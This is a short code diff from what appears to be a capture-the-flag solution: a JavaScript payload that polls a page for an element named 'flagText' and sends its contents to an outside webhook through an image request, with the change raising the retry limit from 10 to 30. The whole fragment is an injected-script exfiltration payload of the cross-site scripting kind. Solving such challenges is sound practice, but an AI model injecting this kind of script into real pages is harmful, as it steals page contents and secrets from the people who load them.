@@ -19,7 +19,7 @@
   const iv = setInterval(() => {
     const el = document.getElementById("flagText");
 
-    if (el || tries++ > 10) {
+    if (el || tries++ > 30) {
       const flag = el ? el.innerText : "FLAG_NOT_FOUND";
       new Image().src = WH + "?flag=" + encodeURIComponent(flag);
       clearInterval(iv);
